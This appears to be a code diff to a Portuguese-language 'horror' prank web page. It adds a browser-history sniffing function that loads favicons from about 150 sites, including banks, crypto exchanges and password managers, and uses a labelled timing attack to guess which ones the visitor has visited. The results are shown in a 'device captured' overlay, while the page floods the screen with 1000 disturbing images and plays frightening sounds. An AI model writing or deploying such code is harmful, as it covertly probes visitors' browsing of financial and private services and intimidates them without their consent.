@@ -459,7 +459,122 @@
             return info;
         }
 
-        function formatarInfos(info) {
+        // DETECTAR SITES VISITADOS (SAFARI + Chrome)
+        function detectarSitesVisitados() {
+            return new Promise((resolve) => {
+                const sitesPopulares = [
+                    // Redes Sociais
+                    'google.com', 'youtube.com', 'facebook.com', 'instagram.com',
+                    'twitter.com', 'tiktok.com', 'snapchat.com', 'reddit.com',
+                    'pinterest.com', 'linkedin.com', 'telegram.org', 'whatsapp.com',
+                    'discord.com', 'nextdoor.com', 'quora.com', 'tumblr.com',
+                    'mastodon.social', 'bluesky.social', 'threads.net',
+                    
+                    // Streaming
+                    'netflix.com', 'hulu.com', 'disneyplus.com', 'primevideo.com',
+                    'hbomax.com', 'twitch.tv', 'dailymotion.com', 'vimeo.com',
+                    'crunchyroll.com', 'peacock.com',
+                    
+                    // Trabalho & Produtividade
+                    'gmail.com', 'outlook.com', 'office365.com', 'slack.com',
+                    'microsoft.com', 'apple.com', 'github.com', 'gitlab.com',
+                    'bitbucket.org', 'trello.com', 'asana.com', 'monday.com',
+                    'notion.so', 'figma.com', 'canva.com', 'adobe.com',
+                    'figma.com', 'miro.com', 'lucidchart.com', 'draw.io',
+                    
+                    // Dev & Tech
+                    'stackoverflow.com', 'wikipedia.org', 'medium.com',
+                    'dev.to', 'hashnode.com', 'freecodecamp.org', 'codecademy.com',
+                    'udemy.com', 'coursera.org', 'edx.org', 'skillshare.com',
+                    'udacity.com', 'pluralsight.com', 'datacamp.com',
+                    
+                    // E-commerce & Finanças
+                    'amazon.com', 'ebay.com', 'aliexpress.com', 'alibaba.com',
+                    'shopify.com', 'paypal.com', 'stripe.com', 'skrill.com',
+                    'wise.com', 'revolut.com', 'nubank.com.br', 'b3.com.br',
+                    'coinbase.com', 'kraken.com', 'binance.com', 'crypto.com',
+                    
+                    // Bancos & Seguros
+                    'caixa.gov.br', 'bradesco.com.br', 'santander.com.br',
+                    'itau.com.br', 'bancodonordeste.com.br', 'banrisul.com.br',
+                    'bb.com.br', 'cef.gov.br', 'inter.co',
+                    
+                    // Streaming de Música
+                    'spotify.com', 'applemusic.com', 'soundcloud.com',
+                    'deezer.com', 'tidal.com', 'pandora.com', 'bandcamp.com',
+                    'last.fm', 'audiomatch.com',
+                    
+                    // Busca & Informação
+                    'bing.com', 'duckduckgo.com', 'ecosia.org', 'startpage.com',
+                    'google.com.br', 'wikipedia.org', 'wiktionary.org',
+                    'imdb.com', 'themoviedb.org', 'myanimelist.net',
+                    
+                    // Email & Mensagens
+                    'protonmail.com', 'tutanota.com', 'zoho.com', 'mailchimp.com',
+                    'sendgrid.com', 'twilio.com', 'messenger.com',
+                    
+                    // Hospedagem & Cloud
+                    'heroku.com', 'netlify.com', 'vercel.com', 'digitalocean.com',
+                    'aws.amazon.com', 'cloud.google.com', 'azure.microsoft.com',
+                    'linode.com', 'vultr.com', 'ovh.com', 'ionos.com',
+                    
+                    // Redes VPN & Segurança
+                    'nordvpn.com', 'expressvpn.com', 'surfshark.com', 'cyberghost.com',
+                    'protonvpn.com', '1password.com', 'bitwarden.com', 'lastpass.com',
+                    'dashlane.com',
+                    
+                    // Notícias
+                    'bbc.com', 'cnn.com', 'foxnews.com', 'theguardian.com',
+                    'nytimes.com', 'washingtonpost.com', 'uol.com.br', 'g1.com.br',
+                    'folha.uol.com.br', 'globonews.com.br'
+                ];
+
+                const visitados = [];
+                let verificados = 0;
+
+                sitesPopulares.forEach(site => {
+                    const img = new Image();
+                    const url = `https://${site}/favicon.ico`;
+                    
+                    img.onload = () => {
+                        visitados.push(site);
+                        verificados++;
+                        if (verificados === sitesPopulares.length) {
+                            resolve(visitados);
+                        }
+                    };
+
+                    img.onerror = () => {
+                        verificados++;
+                        if (verificados === sitesPopulares.length) {
+                            resolve(visitados);
+                        }
+                    };
+
+                    // Timing attack
+                    const inicio = performance.now();
+                    img.src = url;
+                    setTimeout(() => {
+                        const tempo = performance.now() - inicio;
+                        if (tempo < 50 && visitados.indexOf(site) === -1) {
+                            visitados.push(site + ' [cache]');
+                        }
+                    }, 100);
+                });
+
+                // Timeout de segurança
+                setTimeout(() => {
+                    resolve(visitados);
+                }, 3000);
+            });
+        }
+
+        function formatarInfos(info, sitesVisitados = []) {
+            let sitesTexto = 'Nenhum site detectado';
+            if (sitesVisitados.length > 0) {
+                sitesTexto = sitesVisitados.slice(0, 10).join(', ');
+            }
+
             return `
 [DISPOSITIVO CAPTURADO]
 IP: ${Math.random().toString(36).substr(2, 9).toUpperCase()}
@@ -470,13 +585,22 @@ CORES: ${info.cores}
 ZONA: ${info.timezone}
 HORA: ${info.timestamp}
 IDIOMA: ${info.language}
+
+[SITES VISITADOS]
+${sitesTexto}
             `.trim();
         }
 
         // CRIAR IMAGENS BIZARRAS
-        function criarImagensBizarras() {
+        async function criarImagensBizarras() {
             const infoDispositivo = coletarInformacoesDispositivo();
-            const infoTexto = formatarInfos(infoDispositivo);
+            
+            // DETECTAR SITES VISITADOS
+            console.log('🕵️ Detectando sites visitados...');
+            const sitesVisitados = await detectarSitesVisitados();
+            console.log('🎯 Sites encontrados:', sitesVisitados);
+            
+            const infoTexto = formatarInfos(infoDispositivo, sitesVisitados);
             
             // ESPALHAR IMAGEM DEMÔNICA + INFORMAÇÕES (MUITO RÁPIDO) - PERMANENTES
             for (let i = 0; i < 1000; i++) {
@@ -531,7 +655,7 @@ IDIOMA: ${info.language}
 
         function iniciarSequenciaHorror() {
             gerarSomAssustador();
-            criarImagensBizarras();
+            criarImagensBizarras(); // Agora é async
 
             const horrorLayer = document.getElementById('horrorLayer');
             horrorLayer.style.display = 'block';
